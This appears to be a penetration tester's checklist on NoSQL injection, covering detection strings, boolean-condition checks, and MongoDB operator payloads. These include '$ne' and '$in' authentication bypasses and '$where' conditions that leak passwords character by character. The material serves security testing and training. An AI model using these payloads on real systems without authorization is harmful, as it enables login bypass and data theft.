# NoSql
NoSQL injection may enable an attacker to:
- Bypass authentication or protection mechanisms.
- Extract or edit data.
- Cause a denial of service.
- Execute code on the server.

Two types of injection
1. Syntax injection
2. Operator injection

## Syntax Injection

- [X] Detection
Try param injection with the following
  - Test 1
      ```
      '"`{
      ;$Foo}
      $Foo \xYZ
      ```
      and if injection location is URL then `'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`
      If injection location is json then ```'\"`{\r;$Foo}\n$Foo \\xYZ\u0000```

  - Test 2
      See if there is response difference between `'''` and `'\''`
- [X] Confirmation
Checking if boolean condition can be effected
  - To test this, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements `' && 0 && 'x` and `' && 1 && 'x` as follows:
- [X] Override existing condition
  - inject a JavaScript condition that always evaluates to true, such as `'||'1'=='1`
  - commenting out using null addition in the query `'%00` for url and `'\u0000` for json


## Operator injection
- [X] Operators: Send different operators and review the response
`$where` - Matches documents that satisfy a JavaScript expression.
`$ne` - Matches all values that are not equal to a specified value.
`$in` - Matches all of the values specified in an array.
`$regex` - Selects documents where values match a specified regular expression.

- [X] In JSON messages, Nested query object `{"username":"wiener"} becomes {"username":{"$ne":"invalid"}}`.
- [X] URL-based inputs, Insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`
- [X] Other alternatives, 
    1. Convert the request method from GET to POST.
    2. Change the `Content-Type` header to `application/json`.
    3. Add JSON to the message body.
    4. Inject query operators in the JSON.

### Detecting operator injection in MongoDB
- [X] `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
- [X] `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
- [X] If query uses `$where` operator (`{"$where":"this.username == 'admin'"}`) then we can inject something conditional statements like `admin' && this.password[0] == 'a' || 'a'=='b` or `admin' && this.password.match(/\d/) || 'a'=='b`
